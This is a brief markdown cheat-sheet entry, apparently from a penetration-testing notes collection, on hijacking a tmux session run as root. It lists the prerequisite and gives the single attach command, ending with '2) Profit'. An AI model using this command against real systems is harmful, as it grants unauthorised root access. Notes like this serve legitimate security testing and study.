# Tmux Session Hijacking

## Requirements:

Session is run as root and our user has access to it

### 1) Hijack the session

    tmux -S /SOCKET-PATH attach -t SESSION_NAME

### 2) Profit
